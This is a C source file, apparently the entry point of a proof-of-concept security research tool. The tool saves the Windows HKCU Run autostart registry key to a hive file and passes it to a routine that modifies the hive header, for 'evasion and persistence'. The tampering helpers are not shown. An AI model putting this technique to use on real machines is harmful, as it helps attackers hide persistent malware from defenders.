/**********************************************
* Author: Teoderick Contreras [tccontre18 - Br3akp0int]
*
* Description: This POC tool is designed to test the evasion and persistence
*              using reg restore function
*
*
***********************************************/


#include "stdafx.h"
#include "registrydbparser.h"
#include "utility.h"


VOID ShowBanner(HANDLE hConsole, WORD wOriginalAttributes)
{
	DWORD dwfd;
	dwfd = _setmode(_fileno(stdout), _O_WTEXT);
	if (dwfd == -1)
	{
		ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
	}
	SetConsoleTextAttribute(hConsole, BANNER_FOREGROUND);
	wprintf(L"\n\n");

	wprintf(L"╔═══════════════════════════════════════════════════════════════════════════════════════╗\n");
	wprintf(L"║     ██████╗ ███████╗ ██████╗ ██████╗ ███████╗███████╗██████╗ ███████╗██████╗          ║\n");
        wprintf(L"║     ██╔══██╗██╔════╝██╔════╝ ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗         ║\n");
        wprintf(L"║     ██████╔╝█████╗  ██║  ███╗██████╔╝█████╗  █████╗  ██████╔╝█████╗  ██████╔╝         ║\n");
        wprintf(L"║     ██╔══██╗██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██╔══╝  ██╔═══╝ ██╔══╝  ██╔══██╗         ║\n");
	wprintf(L"║     ██║  ██║███████╗╚██████╔╝██║  ██║███████╗███████╗██║     ███████╗██║  ██║         ║\n");
	wprintf(L"║     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝         ║\n");
	wprintf(L"║                        Reg Restore Evasion and Persistence                            ║\n");
	wprintf(L"╚═══════════════════════════════════════════════════════════════════════════════════════╝\n");
	wprintf(L"╔═══════════════════════════════════════════════════════════════════════════════════════╗\n");
	wprintf(L"║             <-- P.O.C. Coded by.| Br3akpoint - teoderick.contreras | -->              ║\n");
	wprintf(L"╚═══════════════════════════════════════════════════════════════════════════════════════╝\n\n");

	int fd = _setmode(_fileno(stdout), dwfd);
	if (fd == -1)
	{
		ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
	}
}


int main(int argc, char* argv[])
{

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
	WORD wOriginalAttributes;
	LPWSTR szDataStrValue = NULL;

	/* Save current console state attributes */
	GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
	wOriginalAttributes = consoleInfo.wAttributes;

	//ShowBanner
	ShowBanner(hConsole, wOriginalAttributes);

	//get commandline argument 
	//LPWSTR* lpszArgList = GetCommandLineParameter(hConsole, wOriginalAttributes);
	if (argc == 2 && strcmp(argv[1], "-d") == 0)
		DEBUG_HEX = TRUE;

	LPCWSTR lpszSaveKeyFilePath = L"save_reg.hive";
	HKEY hkey = HKEY_CURRENT_USER;
	LPCWSTR lpszSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";


	SaveRegistryKey(hkey, lpszSubKey, lpszSaveKeyFilePath, hConsole, wOriginalAttributes);

	ParseAndModifyRegistryHeader(lpszSaveKeyFilePath, hkey, lpszSubKey, hConsole, wOriginalAttributes);

}
